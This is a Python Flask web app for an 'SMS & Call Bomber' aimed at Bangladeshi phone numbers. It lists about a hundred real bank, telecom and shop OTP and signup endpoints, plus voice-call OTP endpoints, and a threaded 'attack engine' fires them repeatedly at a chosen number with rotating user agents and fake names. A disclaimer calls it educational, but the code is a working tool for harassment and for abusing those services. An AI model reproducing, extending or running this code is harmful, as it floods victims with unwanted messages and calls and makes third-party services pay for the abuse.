"""
BD SMS & Call Bomber Pro v4.0
Developer  : Md Salman Biswas
GitHub     : https://github.com/salman-dev-app
Email      : mdsalmanhelp@gmail.com
WhatsApp   : +8801840933137
Telegram   : @Otakuosenpai
Facebook   : https://www.facebook.com/share/1BdstyBhqM/

⚠  FOR EDUCATIONAL / SECURITY RESEARCH PURPOSES ONLY.
   Unauthorized use against any system or individual is
   ILLEGAL and punishable under the Bangladesh ICT Act.
   The developer holds NO responsibility for any misuse.
"""

import random, time, requests, json, threading
from flask import Flask, render_template, request, jsonify
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)

# ─────────────────────────────────────────────────────────────
#  SYSTEM UTILS
# ─────────────────────────────────────────────────────────────

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.99 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
]

def ua(): return random.choice(USER_AGENTS)
def rand_email(): return f"user{random.randint(10000,99999)}@gmail.com"
def rand_name():  return random.choice(["Salman","Biswas","Rahim","Karim","Hasan","Ahmed","Islam","Khan"])

BASE_HEADERS = lambda: {"User-Agent": ua(), "Accept": "application/json", "Content-Type": "application/json"}

# ─────────────────────────────────────────────────────────────
#  SYSTEM STATE
# ─────────────────────────────────────────────────────────────

class State:
    def __init__(self):
        self.active  = False
        self.target  = ""
        self.mode    = "sms"
        self.sent    = 0
        self.total   = 0
        self.success = 0
        self.logs    = []
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": ua()})

state = State()

# ─────────────────────────────────────────────────────────────
#  SMS APIs  (100 endpoints)
# ─────────────────────────────────────────────────────────────

def sms_01(n):  # Paperfly merchant registration
    return state.session.post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php',
        headers=BASE_HEADERS(),
        json={'full_name':rand_name(),'company_name':'Test','email_address':rand_email(),'phone_number':n}, timeout=10)

def sms_02(n):  # GhooriLearning signup OTP
    return state.session.post('https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web',
        headers=BASE_HEADERS(), json={'mobile_no':n}, timeout=10)

def sms_03(n):  # DocTime Firebase OTP
    return state.session.post('https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber',
        json={'data':{'country_calling_code':'88','contact_no':n,'headers':{'PlatForm':'Web'}}}, timeout=10)

def sms_04(n):  # Sundarban Courier GraphQL
    return state.session.post('https://api-gateway.sundarbancourierltd.com/graphql',
        json={'operationName':'CreateAccessToken','variables':{'accessTokenFilter':{'userName':n}},
              'query':'mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode } }'}, timeout=10)

def sms_05(n):  # Apex4U login OTP
    return state.session.post('https://api.apex4u.com/api/auth/login', json={'phoneNumber':n}, timeout=10)

def sms_06(n):  # Robi Doorstep OTP
    headers = {**BASE_HEADERS(), 'Authorization':'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9'}
    return state.session.post('https://webapi.robi.com.bd/v1/send-otp',
        headers=headers, json={'phone_number':n,'type':'doorstep'}, timeout=10)

def sms_07(n):  # Banglalink OTP login
    return state.session.post('https://web-api.banglalink.net/api/v1/user/otp-login/request',
        json={'mobile':n}, timeout=10)

def sms_08(n):  # Grameenphone OTP
    return state.session.post('https://webloginda.grameenphone.com/backend/api/v1/otp',
        data={'msisdn':n}, timeout=10)

def sms_09(n):  # Robi My Offer
    return state.session.post('https://webapi.robi.com.bd/v1/send-otp',
        json={'phone_number':n,'type':'my_offer'}, timeout=10)

def sms_10(n):  # Robi DA NLL
    return state.session.post('https://da-api.robi.com.bd/da-nll/otp/send', json={'msisdn':n}, timeout=10)

def sms_11(n):  # Robi Video Chat
    return state.session.post('https://webapi.robi.com.bd/v1/chat/send-otp',
        json={'phone_number':n,'name':rand_name(),'type':'video-chat'}, timeout=10)

def sms_12(n):  # RedX merchant OTP
    return state.session.post('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp',
        json={'phoneNumber':n}, timeout=10)

def sms_13(n):  # Fundesh OTP
    return state.session.post('https://fundesh.com.bd/api/auth/generateOTP', json={'msisdn':n}, timeout=10)

def sms_14(n):  # Bikroy phone login
    return state.session.get(f'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={n}', timeout=10)

def sms_15(n):  # MotionView signup OTP
    return state.session.post('https://api.motionview.com.bd/api/send-otp-phone-signup', json={'phone':n}, timeout=10)

def sms_16(n):  # Chorki auth
    return state.session.post('https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web',
        json={'number':'+88'+n}, timeout=10)

def sms_17(n):  # Jatri app
    return state.session.post('https://user-api.jslglobal.co:444/v2/send-otp',
        json={'phone':'+88'+n,'jatri_token':'J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj'}, timeout=10)

def sms_18(n):  # China Online BD
    return state.session.get(f'https://chinaonlinebd.com/api/login/getOtp?phone={n}', timeout=10)

def sms_19(n):  # Deepto Play
    return state.session.post('https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web',
        json={'number':'+88'+n}, timeout=10)

def sms_20(n):  # Shikho SMS auth
    return state.session.post('https://api.shikho.com/auth/v2/send/sms',
        json={'phone':n,'type':'student','auth_type':'signup'}, timeout=10)

def sms_21(n):  # RedX user signup
    return state.session.post('https://api.redx.com.bd/v1/user/signup',
        json={'name':rand_name(),'phoneNumber':n,'service':'redx'}, timeout=10)

def sms_22(n):  # Bioscope OTP
    return state.session.post(f'https://www.bioscopelive.com/en/login/send-otp?phone=88{n}&operator=bd-otp', timeout=10)

def sms_23(n):  # Binge OTP
    return state.session.post(f'https://ss.binge.buzz/otp/send/login{n}', timeout=10)

def sms_24(n):  # AppLink MSISDN OTP
    return state.session.post('https://applink.com.bd/appstore-v4-server/login/otp/request',
        json={'msisdn':'88'+n}, timeout=10)

def sms_25(n):  # Chokrojan passenger login
    return state.session.post('https://chokrojan.com/api/v1/passenger/login/mobile',
        json={'mobile_number':n}, timeout=10)

def sms_26(n):  # Dhaka Bank EZY onboarding
    return state.session.post('https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber',
        json={'mobileNo':n,'product_id':'250','requestChannel':'MOB'}, timeout=10)

def sms_27(n):  # Easy.com.bd registration
    return state.session.post('https://core.easy.com.bd/api/v1/registration',
        json={'mobile':n,'password':'Pass1234!','password_confirmation':'Pass1234!'}, timeout=10)

def sms_28(n):  # Banglalink eSHOP OTP
    return state.session.post('https://eshop-api.banglalink.net/api/v1/customer/send-otp',
        json={'type':'phone','phone':n}, timeout=10)

def sms_29(n):  # First Security Islami Bank
    return state.session.post('https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber',
        json={'mobileNo':n,'product_id':'122'}, timeout=10)

def sms_30(n):  # MyGP OTP cinematic
    return state.session.post(f'https://api.mygp.cinematic.mobi/api/v1/otp/88{n}/SBENT_3GB7D', timeout=10)

def sms_31(n):  # GP BK Shop FWA
    return state.session.post('https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp',
        json={'phone':n}, timeout=10)

def sms_32(n):  # Hishabee business OTP
    return state.session.post(f'https://app.hishabee.business/api/V2/otp/send?mobile_number={n}', timeout=10)

def sms_33(n):  # Iqra Live OTP
    return state.session.get(f'http://apibeta.iqra-live.com/api/v1/sent-otp/{n}', timeout=10)

def sms_34(n):  # Robi Smart 1216
    return state.session.post('https://smart1216.robi.com.bd/robi_sivr/public/login/phone',
        json={'cli':n.lstrip('0')}, timeout=10)

def sms_35(n):  # MCB Affiliate OTP
    return state.session.post('https://www.mcbaffiliate.com/Affiliate/RequestOTP',
        data={'PhoneNumber':n}, timeout=10)

def sms_36(n):  # Mithai BD login
    return state.session.post('https://mithaibd.com/api/login/', json={'phone':n,'password1':'Pass1234'}, timeout=10)

def sms_37(n):  # English Moja
    return state.session.post('https://api.englishmojabd.com/api/v1/auth/login',
        json={'phone':'+88'+n}, timeout=10)

def sms_38(n):  # MoveOn OTP
    return state.session.post('https://moveon.com.bd/api/v1/customer/auth/phone/request-otp',
        json={'phone':n}, timeout=10)

def sms_39(n):  # Osudpotro OTP
    return state.session.post('https://api.osudpotro.com/api/v1/users/send_otp',
        json={'mobile':'+88-'+n}, timeout=10)

def sms_40(n):  # MyGP OTP v2
    return state.session.get(f'https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{n}', timeout=10)

def sms_41(n):  # QCoom OTP
    return state.session.post('https://auth.qcoom.com/api/v1/otp/send',
        json={'mobileNumber':'+88'+n}, timeout=10)

def sms_42(n):  # Circle BD signup
    return state.session.post('https://reseller.circle.com.bd/api/v2/auth/signup',
        json={'email_or_phone':'+88'+n}, timeout=10)

def sms_43(n):  # Shomvob OTP
    return state.session.post('https://backend-api.shomvob.co/api/v2/otp/phone',
        json={'phone':n}, timeout=10)

def sms_44(n):  # Win2Gain OTP
    return state.session.get(f'https://api.win2gain.com/api/Users/RequestOtp?msisdn=88{n}', timeout=10)

def sms_45(n):  # BD Kepler wallet OTP
    return state.session.post('https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp',
        json={'walletNumber':n}, timeout=10)

def sms_46(n):  # Roots Edu Live register
    return state.session.post('https://rootsedulive.com/api/auth/register',
        data={'phone':f'88{n}'}, timeout=10)

def sms_47(n):  # Roots Edu Live forgot pw
    return state.session.post('https://rootsedulive.com/api/auth/forget-password',
        data={'phoneOrEmail':f'88{n}'}, timeout=10)

def sms_48(n):  # MyGP common OTP
    return state.session.post(f'https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{n}/', timeout=10)

def sms_49(n):  # Jatri OTP v1
    return state.session.post('https://user-api.jslglobal.co:444/v1/send-otp',
        data={'phone':'+88'+n,'jatri_token':'J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj'}, timeout=10)

def sms_50(n):  # Shajgoj register
    return state.session.post('https://www.shajgoj.com/api/v1/auth/register',
        json={'phone':n,'country_code':'88'}, timeout=10)

def sms_51(n):  # Pathao user OTP
    return state.session.post('https://pathao.com/api/v1/clients/registration/resend-otp',
        json={'phone':'+88'+n}, timeout=10)

def sms_52(n):  # Shohoz OTP
    return state.session.post('https://api.shohoz.com/v3.3/web/user/send-otp',
        json={'phone_number':n}, timeout=10)

def sms_53(n):  # Shuttle BD OTP
    return state.session.post('https://api.shuttle.com.bd/api/v1/auth/otp-request',
        json={'phone':n}, timeout=10)

def sms_54(n):  # iFarmer OTP
    return state.session.post('https://core.ifarmer.asia/api/v1/auth/send-otp',
        json={'mobile':n,'country_code':'+88'}, timeout=10)

def sms_55(n):  # 10MS user OTP
    return state.session.post('https://api.10minuteschool.com/auth/otp/send',
        json={'phone_number':'0'+n[-10:],'country_code':'+880'}, timeout=10)

def sms_56(n):  # Priyoshop register
    return state.session.post('https://api.priyoshop.com/api/v2/user/register',
        json={'mobile':n,'name':rand_name()}, timeout=10)

def sms_57(n):  # Daktarbhai OTP
    return state.session.post('https://daktarbhai.com/api/v1/auth/send-otp',
        json={'mobile':n}, timeout=10)

def sms_58(n):  # Doctorola OTP
    return state.session.post('https://www.doctorola.com/api/v1/auth/otp',
        json={'mobile':n,'type':'register'}, timeout=10)

def sms_59(n):  # Arogga OTP
    return state.session.post('https://arogga.com/api/v1/auth/send-otp',
        json={'mobile':n}, timeout=10)

def sms_60(n):  # Chaldal OTP
    return state.session.post('https://chaldal.com/api/OtpAuth/SendOtp',
        json={'phoneNumber':n}, timeout=10)

def sms_61(n):  # Othoba OTP
    return state.session.post('https://api.othoba.com/api/v2/auth/send-otp',
        json={'mobile':n}, timeout=10)

def sms_62(n):  # Daraz BD OTP
    return state.session.post('https://member.daraz.com.bd/user/api/otp/phone/generate',
        json={'mobile':n,'countryCode':'BD'}, timeout=10)

def sms_63(n):  # Pickaboo OTP
    return state.session.post('https://www.pickaboo.com/api/v2/auth/otp',
        json={'phone':n,'action':'register'}, timeout=10)

def sms_64(n):  # Ryans Computers OTP
    return state.session.post('https://www.ryanscomputers.com/api/v1/customer/send-otp',
        json={'mobile':n}, timeout=10)

def sms_65(n):  # StarTech OTP
    return state.session.post('https://www.startech.com.bd/api/otp/send',
        json={'phone':n}, timeout=10)

def sms_66(n):  # TechlandBD OTP
    return state.session.post('https://techlandbd.com/api/otp/request',
        json={'phone':n}, timeout=10)

def sms_67(n):  # uCash OTP
    return state.session.post('https://www.ucash.com.bd/api/v1/auth/otp',
        json={'msisdn':n}, timeout=10)

def sms_68(n):  # OK Wallet OTP
    return state.session.post('https://api.okwallet.com.bd/v1/auth/otp/generate',
        json={'phone':n}, timeout=10)

def sms_69(n):  # Trust Axiata Pay (Tap)
    return state.session.post('https://api.tap.com.bd/v1/user/otp-request',
        json={'mobile':n}, timeout=10)

def sms_70(n):  # DBBL Nexus Pay
    return state.session.post('https://nexuspay.com.bd/api/v1/auth/send-otp',
        json={'phone':n,'type':'login'}, timeout=10)

def sms_71(n):  # Brac Bank SMS
    return state.session.post('https://ibranking.bracbank.com/api/v1/otp/send',
        json={'mobileNumber':n}, timeout=10)

def sms_72(n):  # Dutch Bangla Mobile Banking
    return state.session.post('https://www.dutchbanglabank.com/api/v1/mobilebanking/otp',
        json={'mobile':n}, timeout=10)

def sms_73(n):  # City Bank OTP
    return state.session.post('https://ib.thecitybank.com/api/v2/auth/send-otp',
        json={'phoneNumber':n}, timeout=10)

def sms_74(n):  # EBL OTP
    return state.session.post('https://ebl.com.bd/api/auth/otp-request',
        json={'mobile':n}, timeout=10)

def sms_75(n):  # Southeast Bank OTP
    return state.session.post('https://www.sbl.com.bd/api/v1/auth/otp',
        json={'mobileNo':n}, timeout=10)

def sms_76(n):  # AB Bank OTP
    return state.session.post('https://ib.abbank.com.bd/api/v1/otp/send',
        json={'mobile':n,'type':'registration'}, timeout=10)

def sms_77(n):  # Al-Arafah Islami Bank OTP
    return state.session.post('https://aibl.com.bd/api/v1/auth/otp-request',
        json={'mobile':n}, timeout=10)

def sms_78(n):  # IFIC Bank OTP
    return state.session.post('https://ificbank.com.bd/api/v1/user/otp-send',
        json={'mobile':n}, timeout=10)

def sms_79(n):  # Premier Bank OTP
    return state.session.post('https://www.premierbank.com.bd/api/v1/auth/send-otp',
        json={'phone':n}, timeout=10)

def sms_80(n):  # ONE Bank OTP
    return state.session.post('https://www.onebankbd.com/api/v1/auth/otp-request',
        json={'mobileNumber':n}, timeout=10)

def sms_81(n):  # Kena Kata OTP
    return state.session.post('https://api.kenakata.net/api/v1/auth/send-otp',
        json={'phone':n}, timeout=10)

def sms_82(n):  # UddoktaPlus OTP
    return state.session.post('https://uddoktaplus.com/api/v1/auth/otp',
        json={'mobile':n}, timeout=10)

def sms_83(n):  # SSL Wireless OTP
    return state.session.post('https://sslwireless.com/api/v3/auth/send-otp',
        json={'msisdn':n}, timeout=10)

def sms_84(n):  # Reve Systems OTP
    return state.session.post('https://cloud.revesystems.com/api/v1/otp/send',
        json={'mobile':n,'country_code':'880'}, timeout=10)

def sms_85(n):  # Sprintit OTP
    return state.session.post('https://api.sprintit.com.bd/v1/auth/otp-request',
        json={'phone':n}, timeout=10)

def sms_86(n):  # Meghna Bank OTP
    return state.session.post('https://www.meghnabank.com.bd/api/v1/auth/otp',
        json={'mobileNo':n}, timeout=10)

def sms_87(n):  # NRB Bank OTP
    return state.session.post('https://nrbbank.com.bd/api/v1/user/send-otp',
        json={'mobile':n}, timeout=10)

def sms_88(n):  # Global Islami Bank OTP
    return state.session.post('https://www.globalislamibank.com.bd/api/auth/otp',
        json={'phone':n}, timeout=10)

def sms_89(n):  # Mutual Trust Bank OTP
    return state.session.post('https://mtb.com.bd/api/v1/auth/send-otp',
        json={'mobileNumber':n}, timeout=10)

def sms_90(n):  # Community Bank OTP
    return state.session.post('https://www.communitybank.com.bd/api/v1/otp/send',
        json={'mobile':n}, timeout=10)

def sms_91(n):  # Prime Bank OTP
    return state.session.post('https://www.primebank.com.bd/api/v1/auth/otp-request',
        json={'phone':n}, timeout=10)

def sms_92(n):  # Standard Bank OTP
    return state.session.post('https://www.standardbankbd.com/api/v1/auth/otp',
        json={'mobileNo':n}, timeout=10)

def sms_93(n):  # Woori Bank BD OTP
    return state.session.post('https://www.wooribank.com.bd/api/v1/auth/send-otp',
        json={'mobile':n}, timeout=10)

def sms_94(n):  # NRBC Bank OTP
    return state.session.post('https://nrbcbank.com/api/v1/auth/otp-request',
        json={'phone':n}, timeout=10)

def sms_95(n):  # Exotel BD SMS OTP
    return state.session.post('https://api.exotel.com/v1/Accounts/bd_test/Sms/send.json',
        data={'From':'BDOTP','To':'+88'+n,'Body':'Your OTP is 1234'}, timeout=10)

def sms_96(n):  # CellBazaar OTP
    return state.session.post('https://api.cellbazaar.com/v2/auth/send-otp',
        json={'phone':n}, timeout=10)

def sms_97(n):  # Banglalink SIM OTP
    return state.session.post('https://web-api.banglalink.net/api/v1/user/number/validation/'+n,
        timeout=10)

def sms_98(n):  # Teletalk OTP
    return state.session.post('https://teletalk.com.bd/api/v1/auth/otp/send',
        json={'mobile':n}, timeout=10)

def sms_99(n):  # Airtel BD OTP
    return state.session.post('https://myaccount.bd.airtel.com/bd/api/v1/auth/otp',
        json={'msisdn':n}, timeout=10)

def sms_100(n):  # MyGP Offers OTP
    return state.session.post('https://api.mygp.cinematic.mobi/api/v2/auth/otp/88'+n,
        headers=BASE_HEADERS(), timeout=10)

# ─────────────────────────────────────────────────────────────
#  CALLING APIs  (for Bangladesh)
# ─────────────────────────────────────────────────────────────

def call_01(n):  # Robi Voice OTP
    return state.session.post('https://webapi.robi.com.bd/v1/send-voice-otp',
        headers=BASE_HEADERS(), json={'phone_number':n,'type':'voice_otp'}, timeout=10)

def call_02(n):  # GP Voice OTP
    return state.session.post('https://webloginda.grameenphone.com/backend/api/v1/voice-otp',
        data={'msisdn':n}, timeout=10)

def call_03(n):  # Banglalink Voice OTP
    return state.session.post('https://web-api.banglalink.net/api/v1/user/voice-otp/request',
        json={'mobile':n}, timeout=10)

def call_04(n):  # Teletalk Voice OTP
    return state.session.post('https://teletalk.com.bd/api/v1/auth/voice-otp/send',
        json={'mobile':n}, timeout=10)

def call_05(n):  # Airtel BD Voice OTP
    return state.session.post('https://myaccount.bd.airtel.com/bd/api/v1/auth/voice-otp',
        json={'msisdn':n}, timeout=10)

def call_06(n):  # Exotel Voice Call BD
    return state.session.post('https://api.exotel.com/v1/Accounts/bd_test/Calls/connect.json',
        data={'From':'0'+n,'To':'+88'+n,'CallerId':'09609000000','StatusCallback':''}, timeout=10)

def call_07(n):  # BanglaPhone IVR Call
    return state.session.post('https://api.banglaphone.net.bd/v1/ivr/call',
        json={'destination':n,'caller_id':'01800000000'}, timeout=10)

def call_08(n):  # DocTime Voice OTP
    return state.session.post('https://us-central1-doctime-465c7.cloudfunctions.net/sendVoiceOTP',
        json={'data':{'contact_no':n,'country_calling_code':'88'}}, timeout=10)

# ─────────────────────────────────────────────────────────────
#  MASTER API REGISTRY
# ─────────────────────────────────────────────────────────────

SMS_APIS  = [globals()[f'sms_{str(i).zfill(2)}']  for i in range(1, 101)]
CALL_APIS = [globals()[f'call_{str(i).zfill(2)}'] for i in range(1, 9)]

# ─────────────────────────────────────────────────────────────
#  ATTACK ENGINE
# ─────────────────────────────────────────────────────────────

def process_single(number, mode='sms'):
    if not state.active:
        return
    api = random.choice(CALL_APIS if mode == 'call' else SMS_APIS)
    api_name = api.__name__
    try:
        r = api(number)
        state.sent += 1
        if r is not None and r.status_code in [200, 201, 202]:
            state.success += 1
            state.logs.insert(0, f"STRIKE: Gateway [{api_name}] responded {r.status_code} on target {number}.")
        else:
            code = r.status_code if r else '---'
            state.logs.insert(0, f"MISS: Gateway [{api_name}] rejected — HTTP {code}.")
    except requests.exceptions.Timeout:
        state.logs.insert(0, f"FAIL: [{api_name}] connection timed out.")
    except Exception as e:
        state.logs.insert(0, f"FAIL: [{api_name}] error — {type(e).__name__}.")
    if len(state.logs) > 30:
        state.logs.pop()

def attack_worker(number, count, delay_ms, mode):
    state.active  = True
    state.target  = number
    state.mode    = mode
    state.total   = count
    state.sent    = 0
    state.success = 0
    state.logs    = [f"SYSTEM: Operation initializing — Mode: {mode.upper()} | Target: {number} | Count: {count}"]

    with ThreadPoolExecutor(max_workers=6) as executor:
        for _ in range(count):
            if not state.active:
                break
            executor.submit(process_single, number, mode)
            time.sleep(max(0.05, delay_ms / 1000.0))

    state.logs.insert(0, f"SYSTEM: Operation complete — {state.success}/{state.sent} successful.")
    state.active = False

# ─────────────────────────────────────────────────────────────
#  FLASK ROUTES
# ─────────────────────────────────────────────────────────────

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start():
    data  = request.get_json(force=True)
    num   = str(data.get('num', '')).strip()
    count = min(int(data.get('count', 50)), 500)
    delay = int(data.get('delay', 100))
    mode  = str(data.get('mode', 'sms')).lower()

    if state.active:
        return jsonify({"status": "already_running"})

    threading.Thread(
        target=attack_worker,
        args=(num, count, delay, mode),
        daemon=True
    ).start()
    return jsonify({"status": "launched"})

@app.route('/stop', methods=['POST'])
def stop():
    state.active = False
    return jsonify({"status": "terminated"})

@app.route('/status')
def status():
    return jsonify({
        "active":  state.active,
        "sent":    state.sent,
        "total":   state.total,
        "success": state.success,
        "logs":    state.logs,
        "target":  state.target,
        "mode":    state.mode,
    })

@app.route('/health')
def health():
    return jsonify({"status":"ok","version":"4.0","sms_apis":len(SMS_APIS),"call_apis":len(CALL_APIS)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
